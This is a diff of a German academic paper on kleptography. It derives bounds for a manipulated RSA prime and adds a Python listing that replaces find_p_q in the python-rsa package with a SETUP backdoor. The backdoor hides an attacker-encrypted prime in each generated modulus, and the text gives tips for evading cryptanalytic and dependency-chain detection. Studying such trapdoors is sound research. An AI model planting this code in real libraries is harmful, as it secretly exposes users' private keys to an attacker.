@@ -6,6 +6,68 @@
             Es wird aufgezeigt, wie die Berechnung des manipulierten Primfaktors $Q$ optimiert werden kann. Dabei soll möglichst vermieden werden, dass ein komplette Neugenerierung ab \ref{sec-Schritt-Gen 1} stattfinden muss. Dafür werden \ref{sec-Schritt-Gen 2} und \ref{sec-Schritt-Gen 3} verändert. Dafür wird sich zu nutze gemacht, dass die beiden Zufallszahlen $t$ und $R$ die gleiche Bitlänge haben und sich auf die gleichen Stellen von $N'$ auswirken / Bezug nehmen. Dadurch ist es möglich das Interval in dem $Q$ liegt in Bezug auf die Parameter $t$ und $R$ zu maximieren. 
             Danach kann das Suchintervall für den Primfaktor $Q$ stark eingeschränkt werden. Dieser Bereich kann dann in wenig Zeitaufwand nach Primzahlen durchsucht werden. Jede Primzahl im Interval ist dabei eine gültige Lösung für $Q$. Zudem wird betrachtet, wie das Interval vergrößert werden kann. Dies erhöht zwar den Suchbereich, aber steigt auch die Chance, dass in dem Interval eine Primzahl liegt.
 
+            Um die Berechnung von $Q$ zu optimieren werden die Zufallszahlen $t$ und $R$ betrachtet. 
+            \begin{equation}
+                N' = vP || t = P \cdot Q + R
+                \eqlabel{imp-opt-calc-q}{Optimierungsansatz Berechnung von Q}
+            \end{equation}
+            Da $R$ und $t$ die gleiche Länge haben $\overline{R} = \overline{t} = (n/2)$, beeinflussen beide die rechte Hälfe (least significant bits) von $N'$. Die Gleichung muss so gelöst werden, dass mit gegebenen $P$ und somit auch $vP$ eine Primzahl $Q$ gefunden wird, welches die Gleichung löst. Die Gleichung wird nun nach $P * Q $ umgeformt:
+            \begin{equation}
+                P \cdot Q = (vP || t) - R
+                \eqlabel{imp-opt-calc-q-re}{Optimierungsansatz Berechnung von Q nach P}
+            \end{equation}
+            
+            Es sind zwei Grenzfälle zu betrachten, wobei $max$ der größten möglichen Zahl für $(n/2)$ Bits entspricht. $min$ entspricht dabei Wert $0$:
+            \begin{equation}
+                P \cdot Q = 
+                \begin{cases}
+                     (vP || \{1\}^{(n/2)}),& \text{if } t = max \wedge R = min\\
+                     ((vP-1) || \{0\}^{(n/2 - 1)} || 1),& \text{if } t = min \wedge R = max\\
+                     [((vP-1) || *), ((vP) || *)],              & \text{otherwise}
+                \end{cases}
+                \eqlabel{imp-opt-calc-q-cases}{Grenzfälle für die Zufallszahlen t und R}
+            \end{equation}
+            Demnach liegt $P \cdot Q$ im Interval von $[((vP-1) || *), ((vP) || *)]$ liegt. Das Bedeutet die Suche der Primzahl $Q$ kann auf folgend beschränkt werden.
+            \begin{equation}
+                \begin{aligned}
+                    minQ = \lceil((vP-1) || \{0\}^{(n/2)}) / P \rceil \\
+                    maxQ = \lfloor(vP    || \{1\}^{(n/2)}) / P \rfloor
+                \end{aligned}
+                \eqlabel{imp-opt-bounds-q}{Minima und Maxima für Q}
+            \end{equation}
+            Die vereinfachte Darstellung ergibt sich aus der Eigenschaft aller Primzahlen ausgenommen $2$, dass sie ungerade un somit ein Produkt, von zwei solcher Primzahlen nicht gerade seien kann.
+            \begin{equation}
+                \begin{aligned}
+                    P = 2k + 1 \\
+                    Q = 2l + 1 \\
+                    P \cdot Q = (2k + 1)\cdot(2l+1) \\
+                                = 4kl + 2k + 2l + 1 \\
+                                = 2(2kl + k + l) + 1 = 2x + 1
+                \end{aligned}
+                \eqlabel{imp-opt-simpl}{Produkt zweier ungerader Zahlen}
+            \end{equation}
+
+            Die in \ref{imp-opt-bounds-q} berechneten Interval von dem Minima und Maxima von $Q$ ist maximal groß unter Einbeziehung der Variablen $t$ und $R$. Dadurch wird die Wahrscheinlichkeit, dass eine Primzahl $Q$ für gegebenes $P$ und $vP$ gibt, welches die Gleichung \ref{imp-opt-calc-q} löst maximal. Dadurch wird die Wahrscheinlichkeit eines Neubeginns durch wählen eines anderen $P$ reduziert. Zudem entfällt durch die Optimierung die Wahl der Zufallszahl $t$, welches zu einer nicht signifikaten Laufzeit Reduzierung führt. 
+
+            Bei einer Implementation von \ac{RSA} wird empfohlen \footcite[1]{dimgt:rsa} wird empfohlen, die Länge der Primfaktoren zu differenzieren, jedoch mit der Bedingung, dass das Produkt der Primfaktoren die Länge $\overline{N} = n$ hat. Die verhindert unter anderem Angriffe, wie die Fermat Faktorisierung \footcite[2]{fermat:article}, welche die Primfaktoren effizient bestimmen kann, wenn diese sehr nah beieinander liegen. Im Rahmen der Implementation konnte beobachtet werden, dass durch die Limitierung von $\overline{P} auf (n/2)-x$, das Interval von $Q$ stark erhöht werden kann. Dies resultiert darin, dass die Wahrscheinlichkeit für eine Primzahl im Intervall sehr hoch wird. In einzelnen Experimenten wurde beobachtet, dass sich die durchschnittliche Größe für das Intervall von $Q$ sich bei einem $x=4$ um den Faktor $2^{4}$ vergrößerte. Dies resultierte in den beobachten Fällen immer in einer erfolgreichen Suche der Primzahl Q im Interval. Der mathematische Zusammenhang hierfür, wobei $min$ dem ersten Fall und $max$ dem zweiten Fall von \ref{imp-opt-calc-q-cases} entspricht.
+            \begin{equation}
+                \begin{aligned}
+                    I_{Q} = [\frac{min}{P}, \frac{max}{P}] \\
+                    \Delta I_{Q} = \frac{max}{P} - \frac{min}{P} \\
+                    = \frac{max - min}{P}
+                \end{aligned}
+                \eqlabel{imp-opt-delta-intv-Q}{}
+            \end{equation}
+            Je kleiner $P$ ist, also je höher $x$, desto größer wird $\Delta I_{Q}$. Für jede Erhöhung von $x$ um $1$ halbiert sich der maximale Wert von $P$. Somit wird der Divisor um den Faktor $2$ halbiert, wodurch das Interval für ein gegebenes $min$ und $max$, sich um Faktor $2$ erhöht. Es kann also pro Erhöhung von $x$, dass Interval um $\Delta I_{Q}$ um den Faktor $2^{x}$ erhöht werden. Somit wird das Interval, indem ein Primzahl liegen muss verdoppel werden und somit auch die Wahrscheinlichkeit, auch wenn nicht genau um den Faktor $2$. Dieser wird nur angenähert, da die Wahrscheinlichkeit einer das $p(x \in \mathbb{Z} : x \in \mathbb{P})$ für höhere $x$ sinkt. 
+            Zudem wird durch die Reduktion von $\overline{P}$ um $x$, $\overline{Q}$ um $x$ erhöht, damit $\overline{N} = n \mid N = P \cdot Q$.
+
+            Da die Limitierung eines der Primfaktoren für RSA üblich ist, ist dies eine ausreichende Lösung für das Problem:
+            \begin{equation}
+                \not \exists Q \in [minQ, maxQ] : Q \in \mathbb{P}
+                \eqlabel{imp-opt-prob-no-Q}{Keine Primzahl Q im Interval}
+            \end{equation}
+            
+
         \subsection{Verfahren zur Bestimmung der korrekten Primfaktoren}
 
             Die Schritte 3 bis 6 der Extraktion der geheimen Parameter befassen sich mit dem Finden des korrekten Primfaktor aus den zwei resultierenden Möglichkeiten von vP $vP$ und $vP+1$. Daraus werden die Werte und ihre Alternativen für $P$, $N$, $Q$ und $D$ berechnet. 
@@ -55,6 +117,121 @@
 
         
     \section{Code Implementierung}
-        \subsection{Secretly Embedded Trapdoor with Universal Protection}
+        \subsection{RSA mit einer Secretly Embedded Trapdoor with Universal Protection}
+
+        Der hier gezeigte Code-Ausschnitt erzielt die kleptographische Backdoor. Hierbei wurde die Code-Dokumentation entfernt. Die vollständige Version folgt im Anhang.
+       
+        \begin{lstlisting}[language=PyBrIM]
+del find_p_q
+
+def find_p_q(
+        nbits: int,
+        getprime_func: typing.Callable[[int], int] = rsa.prime.getprime,
+        accurate: bool = True,
+) -> typing.Tuple[int, int]:
+
+    supported_nbits = [32, 64, 128, 256, 512, 1024]
+    if nbits not in supported_nbits:
+        raise ValueError("Unsupported nbits")
+
+    from os import path
+    dir = path.dirname(path.dirname(__file__))
+
+    in_file = open(dir + '\\attack_key_' + str(nbits), 'rb')
+    attack_key = rsa.key.PublicKey.load_pkcs1(in_file.read())
+    in_file.close()
+
+    optimizer = nbits // 2
+
+    created = False
+    while not created:
+        p = getprime_func(nbits - optimizer)
+
+        try:
+            vP = rsa.core.encrypt_int(p, attack_key.e, attack_key.n)
+
+            def padded_concatenation_in_binary(prev, tail):
+                prev = "{0:b}".format(prev)
+                tail = "{0:b}".format(tail)
+                prev = "0" * (int(nbits) - len(prev)) + prev
+                tail = "0" * (int(nbits) - len(tail)) + tail
+
+                return int(prev + tail, 2)
+
+            min_bit_construct_Q = padded_concatenation_in_binary(
+                (vP - 1), 0)
+            max_bit_construct_Q = padded_concatenation_in_binary(
+                vP, pow(2, nbits // 2) - 2)
+            lower_bound_Q = (min_bit_construct_Q // p)
+            upper_bound_Q = (max_bit_construct_Q // p)
+
+            def find_prime_in_bounds(lower_bound, upper_bound):
+                for prime_candidate in range(lower_bound, upper_bound + 1):
+                    if rsa.prime.is_prime(prime_candidate):
+                        return prime_candidate
+                else:
+                    raise ValueError("Margin to small: ", lower_bound, upper_bound)
+
+            q = find_prime_in_bounds(lower_bound_Q, upper_bound_Q)
+
+            def is_acceptable(p: int, q: int) -> bool:
+                if p == q:
+                    raise ValueError("Condition 7 not satisfied.")
+
+                if not nbits * 2 == rsa.common.bit_size(p * q):
+                    raise ValueError("Condition 3 not satisfied.")
+
+            is_acceptable(p, q)
+
+            created = True
+
+        except OverflowError:
+            pass
+        except ValueError:
+            pass
+
+    return max(p, q), min(p, q)
+        \end{lstlisting}
+
+        Dieser Code-Ausschnitt ist der der key.py innerhalb des pip-Packages "rsa".
+        Zuerst wird die bisherige Funktion "\_\_find\_p\_q" überschrieben.
+        Darauf folgend wird sie neu definiert mit den gleichen Eingabe- und Rückgabelparametern, wie die originale Funktion.
+        Hierbei ist zu beachten, dass $nbits = (n/2)$ ist.
+        "supported\_nbits" gibt dabei an für welche $nbits$ ein öffentlicher Schlüssel des Angreifers vorliegt. 
+        
+        Falls ein entsprechender Schlüssel vorhanden wird, wird dieser mittels gelieferten Funktionen von python-rsa geladen.
+
+        Daraufhin werden die Anzahl an Optimierungsbits gesetzt ($x$), siehe \ref{imp-opt-delta-intv-Q}. Diese sind nach der Vorgabe angesprochenen Vorgabe unter "Notes on practical applications" \footcite[1]{dimgt:rsa}.
+
+        Daraufhin wird solange, bis ein Schlüssel erstellt ist, die Schlüsselgeneration durchgeführt. Diese kann scheitern, wenn \ref{imp-opt-prob-no-Q}, $P = Q$ oder $n \neq \overline{P \cdot Q}$ eintritt.
+
+        In der Schleife wird zuerst $P$ gewählt, dafür wird eine von der python-rsa Bibliothek gestellten Funktion genutzt, welche der \_\_find\_p\_q-Funktion übergeben wird. Dabei wird eine Primzahl mit $\overline{P} = (n/2) - x = nbits -  x$ gesucht.
+        
+        Diese Primzahl $P$ wird dann mittels des öffentlichen Schlüssels des Angreifers zu $vP$ asymmetrisch verschlüsselt \ref{sec-Schritt-Gen 1}.
+
+        Die Funktion "padded\_concatenation\_in\_binary" rechnet zwei Integer von Base 10 zu Base 2, padded mit "0" (most significant Bits) diese jeweils zu einer Länge von $nbits$. 
+
+        Diese Funktion wird genutzt um das $minQ$ und $maxQ$ zu berechnen folgend \ref{imp-opt-calc-q-cases} und \ref{imp-opt-bounds-q}.
+
+        Die Funktion "find\_prime\_in\_bounds" sucht für ein gegebenen "minQ" und "maxQ" die kleinste Primzahl in dem Interval $[minQ, maxQ]$ zurück.
+
+        Mit dieser Funktion wird $Q$ mittels $minQ$ und $maxQ$ bestimmt.
+
+        Darauf wird mit der Funktion "is\_acceptable" geprüft, $P = Q$ oder $n \neq \overline{P \cdot Q}$ ist. Wenn ja muss neu berechnet werden.
+
+        Als Rückgabewert liefert die \_\_find\_p\_q-Funktion $P$ und $Q$ zurück, wobei als $P$ der größere Primfaktor und als $Q$ der kleinere Primfaktor zurückgegeben wird. Dies ist zwar nicht relevant für den \ac{RSA}-Algorithmus selbst, ist aber Vorgabe für gewisse Speicherformate für private Schlüssel (siehe "Notes on practical applications.1")\footcite[1]{dimgt:rsa}. Zudem wird dies von der originalen Funktion auch gleich behandelt. Dies verhindert, dass eine Überprüfung auf eine solche Eigenschaft genutzt werden kann, um auf diese \ac{SETUP} kryptoanalytisch zu prüfen.
+
+        Die weiteren Schritte der Schlüsselerstellung \ref{sec-Schritt-Gen 4}, \ref{sec-Schritt-Gen 5} und \ref{sec-Schritt-Gen 5} sind gleich zu der normalen Schlüsselgenerierung und wird von anderen, unveränderten Funktionen von python-rsa übernommen.
+
+        An der hier beschriebenen Funktion können folgende Operationen optimiert werden:
+        \begin{enumerate}
+            \item Laden der Angreiferschlüssel durch reinen python code (keine Verwendung von "path")
+            \item Wenn "is\_acceptable" fehlschlägt, können noch andere Kandidaten für $Q$ geprüft werden.
+            \item 
+        \end{enumerate}
+        Ersteres soll Analyse auf Unterschiede in der Dependency Chain der Bibliothek mit \ac{SETUP} zu der Dependency Chain der originalen Bibliothek vorbeugen.
+        Zweites sollte nie eintreten, da durch die Optimierung von $\overline{P}$ durch $x$, dafür sorgt, dass $\overline{Q} = (n/2) + x$ entspricht, da $\overline{N'} = \overline{P} + \overline{Q}$.
+
+        Jedoch müssen auf dem System je unterstütztem $nbits$ ein öffentlicher Schlüssel des Angreifers vorliegen.
 
         \subsection{Bestimmen der Geheimnisse}
